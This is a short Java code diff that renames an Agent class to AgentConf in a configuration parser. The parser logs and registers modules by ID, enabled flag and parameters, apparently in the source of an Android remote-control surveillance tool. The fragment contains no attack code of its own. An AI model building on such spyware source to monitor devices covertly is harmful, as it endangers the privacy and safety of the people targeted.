@@ -17,7 +17,7 @@ import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.RCSException;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.action.Action;
-import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.Event;
@@ -226,7 +226,7 @@ public class Configuration {
 			Log.d("RCS", "Agent: " + id + " Enabled: " + enabled
 					+ " Params Len: " + plen);
 
-			final Agent a = new Agent(id, enabled, params);
+			final AgentConf a = new AgentConf(id, enabled, params);
 			statusObj.addAgent(a);
 		}
 
